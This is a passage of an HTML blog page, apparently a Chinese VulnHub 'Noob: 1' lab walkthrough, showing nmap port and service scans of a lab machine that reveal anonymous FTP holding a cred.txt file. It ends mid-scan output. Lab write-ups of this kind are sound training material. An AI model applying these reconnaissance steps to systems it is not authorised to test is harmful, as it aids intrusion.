@@ -1,0 +1,1170 @@
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="一、信息收集#1.1 使用nmap对目标靶机扫描#1zsh: corrupt history file /home/kali/.zsh_history 2┌──(kali㉿kali)-[~] 3└─$ nmap -A -p 1-65535 192.168.242.43 4Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-20 20:14 EST 5Stats: 0:15:50 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan 6SYN Stealth Scan Timing: About 1.22% done; ETC: 17:29 (20:59:18 remaining)-A综合扫描，开启后同时启用以下功能： 1.操作系统探测-O（如windows10、ubuntu20.04、centos7）； 2.服务版本探测-sV（如80端口是Apache、22端口是OpenSSH）; 3.脚本扫描-sC，使用Nmap默认的探测脚本（NSE）检查常见漏洞或详细信息 4.路由追踪--traceroute追踪本机到目标主机的路由路径 -p（port），1-65535覆盖所有TCP端口 但是几乎21h的等待时间太久，而攻略博主中的时间只有18s，这是由于博主的目标主机对关闭的端口返回了RST数据包，Nmap收到后立即跳过，无需等待，而我都情况是，目标主机开启了防火墙或处于丢弃包模式(Drop)，导致端口状态显示为Filtered，Nmap必须等待每个端口超时才能确定状态。
+接下来为修正方案带命令： 第一步，快速发现开放端口
+1nmap -sS -p 1-65535 --min-rate 5000 192.168.242.43 -oN ports.txt结果如下：
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/cybersecurity/vulnhub/easy/vulnhub-Noob_1/">
+  <meta property="og:site_name" content="vnccer">
+  <meta property="og:title" content="Noob: 1">
+  <meta property="og:description" content="一、信息收集#1.1 使用nmap对目标靶机扫描#1zsh: corrupt history file /home/kali/.zsh_history 2┌──(kali㉿kali)-[~] 3└─$ nmap -A -p 1-65535 192.168.242.43 4Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-20 20:14 EST 5Stats: 0:15:50 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan 6SYN Stealth Scan Timing: About 1.22% done; ETC: 17:29 (20:59:18 remaining)-A综合扫描，开启后同时启用以下功能： 1.操作系统探测-O（如windows10、ubuntu20.04、centos7）； 2.服务版本探测-sV（如80端口是Apache、22端口是OpenSSH）; 3.脚本扫描-sC，使用Nmap默认的探测脚本（NSE）检查常见漏洞或详细信息 4.路由追踪--traceroute追踪本机到目标主机的路由路径 -p（port），1-65535覆盖所有TCP端口 但是几乎21h的等待时间太久，而攻略博主中的时间只有18s，这是由于博主的目标主机对关闭的端口返回了RST数据包，Nmap收到后立即跳过，无需等待，而我都情况是，目标主机开启了防火墙或处于丢弃包模式(Drop)，导致端口状态显示为Filtered，Nmap必须等待每个端口超时才能确定状态。
+接下来为修正方案带命令： 第一步，快速发现开放端口
+1nmap -sS -p 1-65535 --min-rate 5000 192.168.242.43 -oN ports.txt结果如下：">
+  <meta property="og:locale" content="zh">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+    <meta property="article:published_time" content="2026-03-11T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-03-11T00:00:00+00:00">
+
+
+  <meta itemprop="name" content="Noob: 1">
+  <meta itemprop="description" content="一、信息收集#1.1 使用nmap对目标靶机扫描#1zsh: corrupt history file /home/kali/.zsh_history 2┌──(kali㉿kali)-[~] 3└─$ nmap -A -p 1-65535 192.168.242.43 4Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-20 20:14 EST 5Stats: 0:15:50 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan 6SYN Stealth Scan Timing: About 1.22% done; ETC: 17:29 (20:59:18 remaining)-A综合扫描，开启后同时启用以下功能： 1.操作系统探测-O（如windows10、ubuntu20.04、centos7）； 2.服务版本探测-sV（如80端口是Apache、22端口是OpenSSH）; 3.脚本扫描-sC，使用Nmap默认的探测脚本（NSE）检查常见漏洞或详细信息 4.路由追踪--traceroute追踪本机到目标主机的路由路径 -p（port），1-65535覆盖所有TCP端口 但是几乎21h的等待时间太久，而攻略博主中的时间只有18s，这是由于博主的目标主机对关闭的端口返回了RST数据包，Nmap收到后立即跳过，无需等待，而我都情况是，目标主机开启了防火墙或处于丢弃包模式(Drop)，导致端口状态显示为Filtered，Nmap必须等待每个端口超时才能确定状态。
+接下来为修正方案带命令： 第一步，快速发现开放端口
+1nmap -sS -p 1-65535 --min-rate 5000 192.168.242.43 -oN ports.txt结果如下：">
+  <meta itemprop="datePublished" content="2026-03-11T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2026-03-11T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1646">
+
+<title>Noob: 1 | vnccer</title>
+<link rel="icon" href="/AK47.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/cybersecurity/vulnhub/easy/vulnhub-Noob_1/">
+<link rel="stylesheet" href="/book.min.4c5f6b0a2c9458d9b295650ba6c81a5261a6e5925a9e3f4141ed0a7db0ed85ac.css" integrity="sha256-TF9rCiyUWNmylWULpsgaUmGm5ZJanj9BQe0KfbDthaw=" crossorigin="anonymous">
+
+
+  <script defer src="/fuse.min.js"></script>
+  <script defer src="/zh.search.min.397ea39ee9b7278158b3763fe9378bf4978298d0dc1d6c1dd3e5cf2b70c93ec0.js" integrity="sha256-OX6jnum3J4FYs3Y/6TeL9JeCmNDcHWwd0&#43;XPK3DJPsA=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+
+
+  
+</head>
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/flamez.png" alt="Logo" /><span>vnccer</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="搜索"
+    aria-label="搜索"
+    maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-286561e3ebfe5d4abf11bf6b3accf647" class="toggle" checked />
+    <label for="section-286561e3ebfe5d4abf11bf6b3accf647" class="flex">
+      <a role="button" class="">
+        🛡️网安</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d5df1c89b3beb5d08d89138670fc5f81" class="toggle" checked />
+    <label for="section-d5df1c89b3beb5d08d89138670fc5f81" class="flex">
+      <a role="button" class="">
+        VULNHUB</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-bfe4bf07ad333338fadcf4204b272d0e" class="toggle" checked />
+    <label for="section-bfe4bf07ad333338fadcf4204b272d0e" class="flex">
+      <a role="button" class="">
+        easy</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Beelzebub_1/" class="">
+      Beelzebub: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Empire_Breakout/" class="">
+      Empire Breakout</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-ICA_1/" class="">
+      ICA: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-jangow_1.0.1/" class="">
+      jangow 1.0.1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Napping-1.0.1/" class="">
+      Napping: 1.0.1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Noob_1/" class="active">
+      Noob: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-The-planets_earth/" class="">
+      The planets earth</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-b3c7140b1d41ab832458c80758cef6c9" class="toggle"  />
+    <label for="section-b3c7140b1d41ab832458c80758cef6c9" class="flex">
+      <a role="button" class="">
+        medium</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/medium/vulnhub-Empire_lupinone/" class="">
+      Empire lupinone</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-199c80af73916a8116f7ec58495f5b3f" class="toggle"  />
+    <label for="section-199c80af73916a8116f7ec58495f5b3f" class="flex">
+      <a role="button" class="">
+        hard</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-a030c4c9965a220abfa64a3686e7613a" class="toggle"  />
+    <label for="section-a030c4c9965a220abfa64a3686e7613a" class="flex">
+      <a role="button" class="">
+        CTF</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-fb9a6f25a6a255f0f4b30e540b36ad0c" class="toggle"  />
+    <label for="section-fb9a6f25a6a255f0f4b30e540b36ad0c" class="flex">
+      <a role="button" class="">
+        easy</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-a2233ec12e82f4e6914028aa2070f6f8" class="toggle"  />
+    <label for="section-a2233ec12e82f4e6914028aa2070f6f8" class="flex">
+      <a role="button" class="">
+        medium</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ba1300881eec4936e836e14da59d30c1" class="toggle"  />
+    <label for="section-ba1300881eec4936e836e14da59d30c1" class="flex">
+      <a role="button" class="">
+        hard</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-fa9454ab1e7bd524e0b944901d8ee1ef" class="toggle"  />
+    <label for="section-fa9454ab1e7bd524e0b944901d8ee1ef" class="flex">
+      <a role="button" class="">
+        📄论文</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-e8767d536f4b541fa88e254ae52e9a6c" class="toggle"  />
+    <label for="section-e8767d536f4b541fa88e254ae52e9a6c" class="flex">
+      <a role="button" class="">
+        💼未来</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-999ff5566a30021306af4121ef9667e4" class="toggle"  />
+    <label for="section-999ff5566a30021306af4121ef9667e4" class="flex">
+      <a role="button" class="">
+        🤖AI</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ff104bad4707f72748825f13d917fdc0" class="toggle"  />
+    <label for="section-ff104bad4707f72748825f13d917fdc0" class="flex">
+      <a role="button" class="">
+        🛠️技能</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/anaconda%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" class="">
+      anaconda环境配置</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/SwitchyOmega-mv3%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/" class="">
+      SwitchyOmega mv3操作记录</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/win-&#43;-r%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/" class="">
+      win &#43; r常用指令</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/%E7%BD%91%E7%AB%99%E6%9E%84%E5%BB%BA/" class="">
+      个人网站构建</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2c59dd5549b1fa1fffc365258122244c" class="toggle"  />
+    <label for="section-2c59dd5549b1fa1fffc365258122244c" class="flex">
+      <a role="button" class="">
+        ☕生活</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+<ul><li><a href="/posts/" title="404">404</a></li></ul>
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header hidden">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>Noob: 1</h3>
+
+  <label for="toc-control">
+    
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#一信息收集">一、信息收集</a>
+          <ul>
+            <li><a href="#11-使用nmap对目标靶机扫描">1.1 使用nmap对目标靶机扫描</a></li>
+            <li><a href="#12-ftp端口">1.2 ftp端口</a></li>
+            <li><a href="#13-80端口">1.3 80端口</a></li>
+          </ul>
+        </li>
+        <li><a href="#二信息分析">二、信息分析</a>
+          <ul>
+            <li><a href="#21文件整理">2.1文件整理</a></li>
+            <li><a href="#22图片检查">2.2图片检查</a></li>
+            <li><a href="#23-ssh登录">2.3 SSH登录</a></li>
+          </ul>
+        </li>
+        <li><a href="#三提权">三、提权</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><h2 id="一信息收集">一、信息收集<a class="anchor" href="#%e4%b8%80%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86">#</a></h2>
+<h3 id="11-使用nmap对目标靶机扫描">1.1 使用nmap对目标靶机扫描<a class="anchor" href="#11-%e4%bd%bf%e7%94%a8nmap%e5%af%b9%e7%9b%ae%e6%a0%87%e9%9d%b6%e6%9c%ba%e6%89%ab%e6%8f%8f">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>zsh: corrupt history file /home/kali/.zsh_history
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>└─$ nmap -A -p 1-65535 192.168.242.43
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>Starting Nmap 7.95 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2026-01-20 20:14 EST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">5</span><span>Stats: 0:15:50 elapsed; <span style="color:#a5d6ff">0</span> hosts completed <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> up<span style="color:#ff7b72;font-weight:bold">)</span>, <span style="color:#a5d6ff">1</span> undergoing SYN Stealth Scan
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">6</span><span>SYN Stealth Scan Timing: About 1.22% <span style="color:#ff7b72">done</span>; ETC: 17:29 <span style="color:#ff7b72;font-weight:bold">(</span>20:59:18 remaining<span style="color:#ff7b72;font-weight:bold">)</span></span></span></code></pre></div><p><code>-A</code>综合扫描，开启后同时启用以下功能：
+1.操作系统探测<code>-O</code>（如windows10、ubuntu20.04、centos7）；
+2.服务版本探测<code>-sV</code>（如80端口是Apache、22端口是OpenSSH）;
+3.脚本扫描<code>-sC</code>，使用Nmap默认的探测脚本（NSE）检查常见漏洞或详细信息
+4.路由追踪<code>--traceroute</code>追踪本机到目标主机的路由路径
+<code>-p</code>（port），<code>1-65535</code>覆盖所有TCP端口
+但是几乎21h的等待时间太久，而攻略博主中的时间只有18s，这是由于博主的目标主机对关闭的端口返回了<code>RST</code>数据包，Nmap收到后立即跳过，无需等待，而我都情况是，目标主机开启了防火墙或处于丢弃包模式(Drop)，导致端口状态显示为<code>Filtered</code>，Nmap必须等待每个端口超时才能确定状态。</p>
+<p>接下来为修正方案带命令：
+第一步，快速发现开放端口</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>nmap -sS -p 1-65535 --min-rate <span style="color:#a5d6ff">5000</span> 192.168.242.43 -oN ports.txt</span></span></code></pre></div><p>结果如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>PORT      STATE SERVICE
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>21/tcp    open  ftp
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>80/tcp    open  http
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>65534/tcp open  unknown</span></span></code></pre></div><p>第二步，针对性扫描服务详情</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 1</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 2</span><span>└─$ sudo nmap -A -p 21,80,65534 192.168.242.43                  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 3</span><span><span style="color:#ff7b72;font-weight:bold">[</span>sudo<span style="color:#ff7b72;font-weight:bold">]</span> password <span style="color:#ff7b72">for</span> kali: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 4</span><span>Starting Nmap 7.95 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2026-01-20 20:41 EST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 5</span><span>Nmap scan report <span style="color:#ff7b72">for</span> 192.168.242.43
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 6</span><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.00072s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 7</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 8</span><span>PORT      STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 9</span><span>21/tcp    open  ftp     vsftpd 3.0.3
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">10</span><span>|_ftp-bounce: bounce working!
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">11</span><span>| ftp-syst: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">12</span><span>|   STAT: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">13</span><span>| FTP server status:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">14</span><span>|      Connected to ::ffff:192.168.188.6
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">15</span><span>|      Logged in as ftp
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">16</span><span>|      TYPE: ASCII
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">17</span><span>|      No session bandwidth limit
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">18</span><span>|      Session timeout in seconds is <span style="color:#a5d6ff">300</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">19</span><span>|      Control connection is plain text
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">20</span><span>|      Data connections will be plain text
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">21</span><span>|      At session startup, client count was <span style="color:#a5d6ff">3</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">22</span><span>|      vsFTPd 3.0.3 - secure, fast, stable
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">23</span><span>|_End of status
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">24</span><span>| ftp-anon: Anonymous FTP login allowed <span style="color:#ff7b72;font-weight:bold">(</span>FTP code 230<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">25</span><span>| -rw-r--r--    <span style="color:#a5d6ff">1</span> <span style="color:#a5d6ff">0</span>        <span style="color:#a5d6ff">0</span>              <span style="color:#a5d6ff">21</span> Sep <span style="color:#a5d6ff">21</span>  <span style="color:#a5d6ff">2021</span> cred.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">26</span><span>|_-rw-r--r--    <span style="color:#a5d6ff">1</span> <span style="color:#a5d6ff">0</span>        <span style="color:#a5d6ff">0</span>              <span style="color:#a5d6ff">86</span> Jun <span style="color:#a5d6ff">11</span>  <span style="color:#a5d6ff">2021</span> welcome
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">27</span><span>80/tcp    open  http    Apache httpd 2.4.29 <span style="color:#ff7b72;font-weight:bold">((</span>Ubuntu<span style="color:#ff7b72;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">28</span><span>|_http-title: Login
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">29</span><span>|_http-server-header: Apache/2.4.29 <span style="color:#ff7b72;font-weight:bold">(</span>Ubuntu<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">30</span><span>65534/tcp open  unknown
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">31</span><span>| fingerprint-strings: 
